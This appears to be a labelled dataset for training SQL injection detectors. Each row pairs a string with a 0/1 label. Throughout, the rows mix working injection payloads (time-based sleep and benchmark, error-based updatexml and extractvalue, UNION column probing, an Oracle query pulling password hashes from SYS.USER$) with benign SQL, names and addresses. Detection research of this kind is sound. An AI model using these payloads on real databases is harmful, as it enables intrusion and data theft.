lu;0
1'+  (  select 'unpz' where 8186  =  8186;1
1  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  7079  =  7079;1
"1%""   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  ""%""  =  """;1
mendracaveitia torreyas;0
SELECT * FROM walk WHERE sudden LIKE '%serious%';0
1 where 6077  =  6077 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --;1
1 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  # fzni;1
"SELECT * FROM thrown WHERE wore BETWEEN ""selection"" AND    ""took""";0
1  )   where 7600  =  7600 union all select null,null,null,null,null,null--;1
lo7ange;0
1  )   where 2044  =  2044 or elt  (  6272  =  6272,sleep  (  5   )    )   --;1
SELECT * FROM goes FETCH FIRST 3 ROWS ONLY;0
select   (  case when   (  2593  =  3592  )   then 2593 else 2593*  (  select 2593 from information_schema.character_sets  )   end  )  #;1
"1%""   )    )     )   order by 1--";1
1   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  1748  =  1748;1
"SELECT email, created_at, name, status FROM logs WHERE description = 'active';";0
pl. herrera de los navarros 68 12-h;0
"INSERT INTO customers (id, user_id, created_at, price) VALUES ('2023-01-01', 'user123', 'user123', 'pending');";0
"1%""  )   union all select null,null,null,null,null,null,null,null,null#";1
1'  )   where 2208  =  2208 rlike sleep  (  5  )  #;1
1   )    )    as fpej where 6790  =  6790 and   (  3020  =  3020  )  *6703--;1
"-9087"" order by 1#";1
SELECT * FROM highest WHERE draw = 'lion'  OR son = 'contrast';0
SELECT * FROM short WHERE feel LIKE '%plain%';0
SELECT * FROM service ORDER BY connected;0
SELECT thumb ( s )  FROM children SELECT who FROM salt;0
â€˜ or 3  =  3 --;1
SELECT shinning ( s )  FROM upward UNION ALL;0
grandy;0
1%'   )    )    and 4595  =  4595#;1
-7271'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  'mdtw'  =  'mdtw;1
"1%""   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (   ""%""  =  """;1
8470;0
1'  )   union all select null,null,null,null,null,null,null,null,null--;1
SELECT himself,fresh FROM unhappy WHERE course = 'giving' UNION SELECT threw, few FROM thumb;0
"1%""   )    )     )   and 7533  =  7533 and    (    (     (  ""%""  =  """;1
boyadgian@campanasextractoras.tv;0
"DELETE FROM inventory WHERE quantity = 'pending';";0
1%' and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --;1
"UPDATE logs SET name = 456 WHERE quantity = 'active';";0
1  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ) ;1
1' in boolean mode  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  #;1
)   or sleep  (  __TIME__  )    =  ';1
1   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #;1
select * from generate_series  (  2382,2382,case when   (  2382  =  4352  )   then 1 else 0 end  )   limit 1--;1
protectorio;0
SELECT * FROM gravity ORDER BY arrive, strange;0
l16o2o;0
8,97E+15;0
"-5187""  )   union all select 3373,3373#";1
SELECT TOP 3 * FROM twice;0
SELECT * FROM language FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM are;0
(  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ;1
espaldilla;0
1 and 9412  =  6877#;1
14188360m;0
-4882' order by 1#;1
SELECT extra ( s )  FROM have UNION ALL;0
1   )    )     )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  9255  =  9255;1
1' in boolean mode  )   union all select null,null,null,null,null,null,null,null--;1
nazareno;0
SELECT AVG ( prevent )  FROM becoming  SELECT SUM ( listen ) ;0
-1890'   )    )     )   or 8526  =  1389 and    (    (     (  'ecgt'  =  'ecgt;1
SELECT value,section,touch,aware,air     (  (  wise JOIN fully ON box.exchange =  careful.respect )   INNER JOIN noneON Orders.brick =  paper.richID ) ;0
or 2 > 1;1
1'   )    )    and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'cbwx'  =  'cbwx;1
"SELECT email, id FROM orders WHERE description = 'user123';";0
1'  )   where 2121  =  2121 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --;1
eddier;0
select case when 5559  =  3483 then 1 else null end--;1
SELECT AVG ( handsome ) FROM hunter;0
INSERT INTO base ( baseball, hunter, freedom, physical, top, corner )  VALUES  ( 'mass', 'tide'. that', 'meat', 'food', 'maybe', 'seed' )  ;0
guzman de alfarache, 18,;0
SELECT COUNT ( DISTINCT date )  FROM ground;0
1'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   'ayqn' like 'ayqn;1
1 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  # sipo;1
1  )   where 4698  =  4698 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --;1
"1""   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #";1
arrafiz;0
SELECT * FROM put WHERE storm = 'silver' LIMIT 3;0
braiam;0
1'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  ;1
danning-marrow@etxarriaranatz.nr;0
swearing;0
"1%""   )    )     )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --";1
1',  (  select   (  case when   (  5433  =  5433  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ;1
efran;0
1'   )    )     )   or sleep  (  5  )   and    (    (     (  'bmnf' like 'bmnf;1
SELECT TOP 50 PERCENT * FROM aware;0
SELECT AVG ( accident ) FROM center SELECT SUM ( can ) ;0
1,  (  case when 6620  =  3092 then 1 else null end  )  ;1
43751883h;0
2,04E+15;0
pijahumeda;0
SELECT * FROM course FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM season;0
1 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  # myqr;1
SELECT * FROM port WHERE Price NOT BETWEEN 10 AND 20;0
@variable	local variable;1
SELECT TOP 50 PERCENT * FROM walk;0
select * from generate_series  (  3267,3267,case when   (  3267  =  5900  )   then 1 else 0 end  )   limit 1--;1
paseo arco del ladrillo 48 10?h;0
DELETE FROM tomorrow WHERE solar = 'to';0
1'||  (  select 'txyy' where 6500  =  6500 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1   )    )   ||';1
schouwen;0
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19;1
conde;0
wieth@camiones-hibridos.md;0
and (select substring(@@version,3,1))='S';1
87853992h;0
select * from users where id  =  '1' or .<1 union select 1,@@VERSION -- 1';1
SELECT aroundID AS ID, appearance AS aid FROM child;0
SELECT DISTINCT corner FROM shore;0
"1""   )    )    as hbfi where 4773  =  4773 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --";1
-3596'  )   union all select 5349,5349,5349,5349,5349,5349#;1
1 and elt  (  1210  =  1210,sleep  (  5   )    )   ;1
sojuela;0
end and 'aenf'  =  'aenf;1
8,59E+14;0
or '1'  =  '1;1
SELECT * FROM more  WHERE exactly NOT LIKE '[teach]%';0
4909;0
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14#;1
pamente;0
"-9451""   )    )     )   union all select 4211,4211,4211,4211,4211,4211,4211--";1
SELECT * FROM worry WHERE atom IN  ( SELECT tall FROM stand ) ;0
1 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  -- ctdx;1
1' in boolean mode  )   or elt  (  5873  =  5873,sleep  (  5   )    )   #;1
-2601'  )   union all select 2866,2866,2866,2866,2866,2866--;1
UPDATE adult SET honor = 'gain'WHERE chicken = 'paragraph';0
SELECT AVG ( long ) FROM heavy SELECT SUM ( bright ) ;0
SELECT pour, maybe, balloonFROM halfway WHERE month  IS NOT NULL;0
1'||  (  select 'yhkt' from dual where 7105  =  7105 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x   )    )   ||';1
-9297  )   union all select 6841,6841,6841,6841,6841--;1
1'  )   where 6274  =  6274 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --;1
SELECT * FROM near WHERE carefully = 'way' LIMIT 3;0
busoms redolad;0
"1""   )    )    and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ""mzhk""  =  ""mzhk";1
"SELECT created_at FROM employees WHERE description = 123;";0
SELECT lungs, voice, broadFROM produce WHERE chamber  IS NOT NULL;0
-7008'   )    )    union all select 9080,9080,9080#;1
ORDER BY 16;1
1'+  (  select fhbk where 2570  =  2570 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   +';1
1'   )    )    union all select null,null,null,null--;1
olascoaga huix;0
glatzeder.karr@lamejorplaya.so;0
SELECT COUNT ( instead ) FROM down;0
SELECT * FROM scared WHERE hunter IN  ( 'dress', 'birds', 'loose' )  ;0
"UPDATE customers SET id = 'user123' WHERE name = 'active';";0
1'   )    )     )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  'mfmk'  =  'mfmk;1
DELETE FROM dangerous WHERE strike = 'picture';0
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5#;1
"admin""or 1=1 or """"=""";1
"1""   )    )    as ajwe where 1153  =  1153 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --";1
34116;0
SELECT * FROM sun  WHERE me NOT LIKE '[mental]%';0
SELECT * FROM ride FETCH FIRST 50 PERCENT ROWS ONLY;0
ferreries;0
-5139   )    )    union all select 3373,3373,3373,3373,3373,3373,3373,3373#;1
3,12E+15;0
SELECT * FROM bound;0
astor;0
pistan robredo;0
1'||  (  select 'yaii' from dual where 7317  =  7317 union all select null,null,null,null,null,null,null,null,null#;1
-6254%'   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #;1
senterada;0
select   (  case when   (  3486  =  6373  )   then 3486 else 3486*  (  select 3486 from mysql.db  )   end  )  #;1
AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i;1
25214;0
1'   )    )     )   and 7401  =  9838#;1
1'+  (  select immd where 7499  =  7499 union all select null,null,null,null,null,null,null,null#;1
SELECT fire ( s ) FROM stepped INNER JOIN;0
SELECT * FROM made WHERE connected NOT BETWEEN 'aboard' AND 'aware';0
8110;0
darcy@google-movil.dz;0
4,62E+15;0
-1492 where 2788  =  2788 union all select 2788#;1
"DELETE FROM inventory WHERE description = 'active';";0
1'||  (  select 'bupa' from dual where 8548  =  8548;1
t1iesti70;0
-6368' union all select 6529,6529,6529--;1
1'+  (  select 'yjpp' where 8966  =  8966;1
1'  )   as rqfq where 7077  =  7077 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --;1
1'+  (  select 'aliz' where 5050  =  5050 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )    )   +';1
85009456f;0
ORDER BY 20#;1
bielat;0
"DELETE FROM employees WHERE email = 'user123';";0
1%'  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  '%'  =  ';1
or 1  =  1#;1
" select * from users where id  =  1 or ""$&"" or 1  =  1 -- 1";1
SELECT * FROM charge ORDER BY free ASC, brush DESC;0
vartan;0
pl. cantarranillas 21,;0
calle eduard toldra 137 5?a;0
-2766%'   )    )    union all select 4458,4458,4458,4458,4458--;1
"1""   )    )     )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""oohx"" like ""oohx";1
"-4822"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""owbp""  =  ""owbp";1
at89a7218;0
"1""   )    )    as itxo where 7916  =  7916";1
AS INJECTX WHERE 1=1 AND 1=0#;1
AND 7300=7300 AND ('pKlZ'='pKlZ;1
-9405'  )   union all select 8283,8283,8283,8283--;1
nona;0
SELECT Orders.anybodyrID, Employees.start, Employees.fill FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.shirtID ORDER BY Orders.jetID;0
select case when 8514  =  3207 then 1 else null end--;1
"UPDATE employees SET description = 'pending' WHERE created_at = 123;";0
SELECT AVG ( greatest ) FROM doctor SELECT SUM ( route ) ;0
SELECT * FROM swing;0
44338;0
1  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  ;1
1  )   where 2888  =  2888 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --;1
SELECT * FROM  ( SELECT nuts FROM little ) ;0
"1"" where 1203  =  1203 union all select null,null,null--";1
SELECT peace ( s )  FROM aware UNION ALL;0
"1""   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --";1
SELECT Employees.buried, COUNT ( Orders.sleptID )  AS eagerFROM    ( OrdersINNER JOIN wild ON Orders.angryID  =  Employees.southernID ) ;0
-2102' where 3644  =  3644 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --;1
SELECT AVG ( half ) FROM balance SELECT SUM ( break ) ;0
SELECT AVG ( favorite ) FROM softly;0
"1""  )   where 9115  =  9115";1
"1""   )    )     )   and 4595  =  4595#";1
44706;0
78370849m;0
SELECT cold,white,alone,frozen,new     (  (  room JOIN science ON today.somehow =  dark.specific )   INNER JOIN bushON Orders.wire =  church.whistleID ) ;0
SELECT MIN ( produce )  AS boy FROM donkey;0
call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   '%'  =  ';1
8282;0
"-6890""   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""ftho"" like ""ftho";1
calle robregordo, 171 10-c;0
SELECT * FROM job FETCH FIRST 50 PERCENT ROWS ONLY;0
lurlene;0
SELECT asleep ( s FROM usual RIGHT JOIN;0
"SELECT name, user_id FROM sessions WHERE email = 'pending';";0
48042322z;0
hallenbe;0
34192;0
SELECT period ( s )  FROM thought SELECT even FROM busy;0
SELECT * FROM furniture ORDER BY improve DESC;0
1' in boolean mode  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  #;1
"1""   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  ""tpxo"" like ""tpxo";1
5130;0
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  ""woun"" like ""woun";1
en546al;0
"-1422%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """;1
SELECT * FROM rather WHERE explain = 'known'  OR circus = 'thirty';0
21468433a;0
SELECT * FROM cotton WHERE bar NOT IN  ( 'addition', 'off', 'page' )  ;0
"1""   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""gcyp"" like ""gcyp";1
SELECT COUNT ( spring ) FROM citizen;0
bakey_noah@inmobiliariahangar.ki;0
SELECT * FROM exactly WHERE there IN  ( 'individual', 'neighbor', 'report' )  ;0
buchel-alymer@gemas.org.bu;0
43427;0
SELECT * FROM mad WHERE Price NOT BETWEEN 10 AND 20;0
1'   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  'xdui' like 'xdui;1
1'   )    )    and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   'vcph'  =  'vcph;1
9,17E+15;0
1 where 7412  =  7412 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --;1
1%'  )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --;1
cha$9i74r0;0
1'||  (  select 'ywfo' from dual where 4168  =  4168 rlike sleep  (  5  )  #;1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14--;1
1 where 9774  =  9774;1
SELECT * FROM shoe WHERE Price NOT BETWEEN 10 AND 20;0
particular teresa orozco 101;0
-2793'  )   where 2621  =  2621 union all select 2621#;1
sandberg@3horas.tl;0
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""gzhp""  =  ""gzhp";1
"1""  )   as eaxo where 2728  =  2728";1
"1%""   )    )    union all select null,null,null,null,null,null,null,null,null--";1
SELECT * FROM  ( SELECT conversation FROM pick ) ;0
63829565b;0
1%'   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #;1
end and 'blit'  =  'blit;1
refrigerativo;0
SELECT * FROM  ( SELECT meal FROM sat ) ;0
SELECT * FROM century ORDER BY tobacco DESC;0
SELECT AVG ( build ) FROM gradually;0
"UPDATE employees SET user_id = 'john@example.com' WHERE status = '2023-01-01';";0
"DELETE FROM customers WHERE email = 'pending';";0
charlot@ringringrent.rw;0
SELECT * FROM fierce WHERE valley NOT LIKE '[can]%';0
-6600'  )   union all select 5566,5566#;1
"1""  )   as fkco where 8877  =  8877 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --";1
SELECT * FROM cabin 3;0
SELECT * FROM quiet WHERE arm = 'detail'  AND  ( fellow = 'service' OR cloud = 'flew' ) ;0
33423;0
enaltecedor;0
"1""   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  ""epfg"" like ""epfg";1
1'||  (  select 'lmsc' from dual where 1162  =  1162 order by 1--;1
SELECT * FROM sugar WHERE send NOT BETWEEN 'everybody' AND 'not';0
"1""   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  ""czvm"" like ""czvm";1
1'  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ;1
peaflor;0
"1""  )   where 9770  =  9770 union all select null,null,null,null,null,null--";1
-8924   )    )    as jybr where 7901  =  7901 or elt  (  1032  =  1032,3623  )  --;1
"1%""   )    )    and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   ""%""  =  """;1
1' and sleep  (  5  ) ;1
cazallas caminal;0
crovetto roger;0
SELECT * FROM greatly WHERE tropical  BETWEEN 10 AND 20;0
if  (  7340  =  9813  )   select 7340 else drop function yppp--;1
"-9384%"" union all select 7031,7031,7031,7031,7031,7031,7031,7031,7031#";1
oplinger;0
SELECT flew ( s )  FROM only UNION;0
select * from users where id  =  1 or <. or 1  =  1 -- 1;1
SELECT * FROM note 3;0
-2046'  )   union all select 6668,6668--;1
1' where 9420  =  9420 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --;1
1   )    )    as epfz where 5471  =  5471;1
1'||  (  select 'wgte' from dual where 6316  =  6316 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   ||';1
1'  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ;1
c/ pirucha s/n 4-e;0
"DELETE FROM customers WHERE quantity = 'active';";0
1 or benchmark  (  10000000,MD5  (  1   )    )   #;1
9124;0
cervera del ro alhama;0
9.84is22nte334c799;0
1' in boolean mode  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  #;1
1 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ) ;1
orbita;0
-3978 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  -- mtun;1
SELECT * FROM separate WHERE lunch NOT LIKE 'five%';0
"1""  )   where 1392  =  1392 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --";1
"1""   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   ""pmmr""  =  ""pmmr";1
1   )    )    as nxdf where 1696  =  1696 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #;1
1'   )    )    and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --;1
-- &password  = ;1
curi piccech;0
(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and '%'  =  ';1
